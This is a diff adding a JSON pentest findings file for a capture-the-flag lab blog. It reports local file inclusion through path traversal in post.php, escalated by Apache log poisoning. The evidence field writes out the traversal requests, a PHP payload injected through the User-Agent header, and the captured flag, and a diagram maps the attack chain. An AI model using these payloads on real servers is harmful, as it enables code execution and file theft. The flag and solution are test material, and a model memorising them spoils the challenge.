@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:59:20.318283+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "86d5a569-c20b-473f-bf9b-8666ebd0de4f",
+      "timestamp": "2026-04-13T11:59:20.318131+00:00",
+      "title": "CTF Flag \u2014 LFI via Log Poisoning on post.php?id= parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:49967/post.php?id=",
+      "description": "The blog application includes arbitrary files from the server filesystem via the `id` GET parameter in post.php. The parameter is prepended with `posts/` but allows unrestricted path traversal using `../`. This enables PHP log poisoning: inject PHP code into Apache's access.log via the User-Agent header, then use LFI to include the log file and execute the injected PHP. The flag was stored at /FLAG.php (executed as PHP with no visible output), but was exfiltrated by injecting file_get_contents('/FLAG.php') via the User-Agent and reading it from the included log.",
+      "evidence": "Step 1 - LFI confirmed: GET /post.php?id=../../../../var/log/apache2/access.log returned 200 with log content.\n\nStep 2 - Log poisoning: GET / with User-Agent: <?php echo file_get_contents('/FLAG.php'); ?>\n\nStep 3 - Flag extraction via log inclusion:\nGET /post.php?id=../../../../var/log/apache2/access.log\nResponse included:\n172.18.0.1 - [13/Apr/2026:11:58:25 +0000] \"GET / HTTP/1.1\" 200 2596 \"-\" \"<?php flag{6f592559-dcf0-436c-ad0f-f0447b0444d9} ?>\"\n\nFLAG: flag{6f592559-dcf0-436c-ad0f-f0447b0444d9}",
+      "tool_used": "manual HTTP exploitation",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "b73e336f-9938-46ad-8e1e-65642aced96e",
+      "timestamp": "2026-04-13T11:59:39.401681+00:00",
+      "title": "Encoder64 Blog - Attack Architecture",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] -->|\"1. Inject PHP in User-Agent\"| Apache[\"Apache 2.4.54 Port 49967\"]\n  Apache -->|\"writes to\"| Log[\"/var/log/apache2/access.log\"]\n  Attacker -->|\"2. GET post.php?id=../../../../var/log/apache2/access.log\"| PostPHP[\"post.php LFI\"]\n  PostPHP -->|\"include()\"| Log\n  Log -->|\"PHP executes injected code\"| FileRead[\"file_get_contents('/FLAG.php')\"]\n  FileRead -->|\"reads\"| FlagFile[\"/FLAG.php (flag{6f592559...})\"]\n  FlagFile -->|\"output in response\"| Attacker\n  PostPHP -->|\"also includes posts/\"| Posts[\"posts/ directory (blog posts)\"]\n  Apache --> Index[\"index.php (blog home)\"]\n  Apache --> About[\"about.php\"]\n  Apache --> Contact[\"contact.php\"]"
+    }
+  ]
+}
